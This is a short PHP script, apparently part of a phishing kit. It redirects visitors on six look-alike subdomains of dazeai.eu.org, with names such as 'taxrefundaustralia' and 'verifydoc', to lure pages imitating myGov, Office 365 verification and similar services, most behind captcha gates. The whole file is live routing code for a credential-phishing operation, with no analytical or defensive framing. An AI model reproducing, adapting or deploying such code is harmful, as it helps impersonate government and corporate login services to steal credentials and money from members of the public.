<?php


$currentURL = "http" . (isset($_SERVER['HTTPS']) ? "s" : "") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($currentURL, "taxrefundaustralia.dazeai.eu.org") !== false) {
    // Redirect to the specified URL
    header("Location: https://taxrefundaustralia.dazeai.eu.org/mygov/mygovau/");
    exit(); // Ensure no further code execution
} if (strpos($currentURL, "reviewmonthlysecurity.dazeai.eu.org") !== false) {
    // Redirect to the specified URL
    header("Location: https://reviewmonthlysecurity.dazeai.eu.org/fin/fin/");
    exit(); // Ensure no further code execution
} if (strpos($currentURL, "administration.dazeai.eu.org") !== false) {
    // Redirect to the specified URL
    header("Location: https://administration.dazeai.eu.org/mygov/1a/");
    exit(); // Ensure no further code execution
} if (strpos($currentURL, "montlyreviewsecurity.dazeai.eu.org") !== false) {
    // Redirect to the specified URL
    header("Location: https://montlyreviewsecurity.dazeai.eu.org/gesa/captcha.php");
    exit(); // Ensure no further code execution
} if (strpos($currentURL, "verifydoc.dazeai.eu.org") !== false) {
    // Redirect to the specified URL
    header("Location: https://verifydoc.dazeai.eu.org/office365/captcha.php");
    exit(); // Ensure no further code execution
} if (strpos($currentURL, "documentaccesss.dazeai.eu.org") !== false) {
    // Redirect to the specified URL
    header("Location: https://documentaccesss.dazeai.eu.org/office365verify/captcha.php");
    exit(); // Ensure no further code execution
}

?>